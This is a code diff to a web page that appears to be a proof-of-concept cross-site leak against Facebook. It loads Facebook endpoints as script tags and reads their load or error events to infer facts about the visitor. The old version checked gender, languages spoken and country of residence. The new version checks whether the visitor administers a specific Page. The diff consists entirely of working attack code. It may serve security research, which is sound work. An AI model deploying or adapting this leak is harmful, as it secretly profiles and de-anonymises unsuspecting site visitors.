@@ -10,18 +10,19 @@
 
 		const counter = 0
 
-		const basicMessages = ['The user\'s gender is set as:', ['The user speaks:', 'The user does not speak:'], ['The user speaks:', 'The user does not speak:'], ['The user lives in:', 'The user doesn\'t live in:'], ['The user lives in:', 'The user doesn\'t live in:']]	
-		const type = [['Female', 'Male'], 'English (US)', 'Portuguese (BR)', 'Brazil', 'United States']
+		const basicMessages = ['Is user adminstrator of Page:']	
+		const type = [['User is adminstrator of the Page', 'User is not the adminstrator of the Page']]
 
-		let comments = ["109452263767626", "109482077097978", "109508987095287", "109510773761775", "109512290428290"];
+		let posts = ["107262447322405"];
 
 		onload = () => {
-			checkReport(comments.shift(), 0);
+			checkReport(posts.shift(), 0);
 		}
 
-	    checkReport = (commentId, counter) => {
+
+	    checkReport = (itemId, counter) => {
 	        let script = document.createElement("script");
-	        script.src = `https://m.facebook.com/comment/history/?ctoken=${commentId}`;
+	        script.src = `https://mbasic.facebook.com/rapid_report/?context={"reportable_ent_token":"${itemId}"`;
 	        
 	        script.onload = () => {
 	            showResult(true, counter);
@@ -41,8 +42,8 @@
 	    		document.getElementById("knownHandler").innerHTML += `${!Array.isArray(basicMessages[counter]) ? basicMessages[counter] : basicMessages[counter][1]} "${!Array.isArray(type[counter]) ? type[counter] : type[counter][1] }".<br><br>`;
 	    	}
 
-	        if (comments.length != 0) {
-	        	checkReport(comments.shift(), ++counter);
+	        if (posts.length != 0) {
+	        	checkReport(posts.shift(), ++counter);
 	        }
 	    }
 	</script>
